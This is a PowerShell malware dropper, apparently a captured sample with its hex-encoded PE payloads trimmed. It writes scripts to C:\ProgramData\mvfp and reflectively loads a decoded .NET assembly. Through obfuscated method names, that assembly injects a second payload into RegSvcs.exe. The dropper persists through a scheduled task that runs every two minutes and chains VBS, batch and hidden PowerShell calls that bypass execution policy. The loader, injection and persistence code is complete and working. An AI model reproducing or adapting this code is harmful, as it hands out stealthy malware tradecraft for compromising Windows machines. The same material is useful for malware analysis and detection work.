$eyva = "C:\ProgramData\mvfp"
New-Item $eyva -ItemType Directory -Force
$Content = @'
function vgit {
param($gbla)$gbla = $gbla -split '(..)' | ? { $_ }
ForEach ($aokn in $gbla)
{
[Convert]::ToInt32($aokn,16)
}
}
Try{
$zgoa  = '4D5A9...000'  # The omitted '4D5A9...000' is actually a 103445 character long string.
}catch{}
Try{
$cwsx = '4D5A9...000'  # The omitted '4D5A9...000' is actually a 139165 character long string.
}catch{}
Try{
[Byte[]] $vgit = vgit $aokn
[Byte[]] $wdhp = vgit $zgoa
[Byte[]] $mbsw = vgit $cwsx
$jzax = [Ref].Assembly
$dlkj = $jzax::'Load'(($wdhp))
}catch{}
Try{
$rgmi = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcsxehytzajldvmqbs.exe'
$dlkj.'GetType'('NewsxehytzajldvmqbPE.PE'.replace('sxehytzajldvmqb','')).GetMethod('Exsxehytzajldvmqbecusxehytzajldvmqbte'.replace('sxehytzajldvmqb','')).'Invoke'($null,($rgmi.replace('sxehytzajldvmqb',''),$mbsw))
$null,[object[]] ,$null ,$null ,$null ,$null ,$null ,$null ,$null ,$null ,$null ,$null ,$null ,$null ,$null ,$null ,$null,  $rgmi
}catch{}
'@
[IO.File]::WriteAllText("C:\ProgramData\mvfp\dlqp.ps1", $Content)
Sleep 1
$Content = @'
try 
{
&'schtasks.exe' '/create' '/sc' 'minute' '/mo' 2 '/tn' ''mvfp '/tr' (('C:\ProgramData\mvfp\mvfp.vbs'));
} catch { }
'@
[IO.File]::WriteAllText("C:\ProgramData\mvfp\mvfp.ps1", $Content)
$Content = @'
on error resume next
WScript.Sleep 10000
set gfrt = CreateObject("WScript.Shell")
gfrt.run "C:\ProgramData\mvfp\1.bat",0
'@
[IO.File]::WriteAllText("C:\ProgramData\mvfp\mvfp.vbs", $Content)
$Content = @'
CMD /C powershell -NOP -WIND HIDDEN -eXEC BYPASS -NONI "C:\ProgramData\mvfp\dlqp.ps1"
'@
[IO.File]::WriteAllText("C:\ProgramData\mvfp\1.bat", $Content)
Start-Sleep 11
$wmar = 'ReadAllText'.Replace('!','');
IEX([IO.File]::$wmar('C:\ProgramData\mvfp\mvfp.ps1'))
